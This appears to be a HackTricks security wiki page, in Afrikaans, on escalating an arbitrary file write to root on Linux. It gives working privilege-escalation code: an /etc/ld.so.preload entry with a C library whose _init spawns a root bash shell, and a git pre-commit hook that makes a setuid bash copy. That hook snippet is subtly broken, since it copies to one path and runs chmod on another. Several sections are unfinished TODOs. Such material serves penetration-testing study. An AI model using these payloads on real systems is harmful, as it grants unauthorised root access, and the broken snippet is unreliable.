# Willekeurige Lêer Skryf na Root

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### /etc/ld.so.preload

Hierdie lêer werk soos **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID-binêre lêers**.\
As jy dit kan skep of wysig, kan jy net 'n **pad na 'n biblioteek wat gelaai sal word** by elke uitgevoerde binêre lêer, byvoeg.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hakke

[**Git hakke**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat uitgevoer word by verskeie **gebeure** in 'n git-opgaar soos wanneer 'n toewysing geskep word, 'n saamvoeging... Dus, as 'n **bevoorregte skrip of gebruiker** gereeld hierdie aksies uitvoer en dit moontlik is om in die `.git`-vouer te **skryf**, kan dit gebruik word vir **privilege-escalation**.

Byvoorbeeld, Dit is moontlik om 'n skrip te **genereer** in 'n git-opgaar in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe toewysing geskep word:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Cron & Tyd lêers

TODO

### Diens & Soket lêers

TODO

### binfmt\_misc

Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binêre lêer watter tipe lêers moet uitvoer. TODO: kontroleer die vereistes om hierdie te misbruik om 'n omgekeerde dop uit te voer wanneer 'n algemene lêertipe oop is.

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
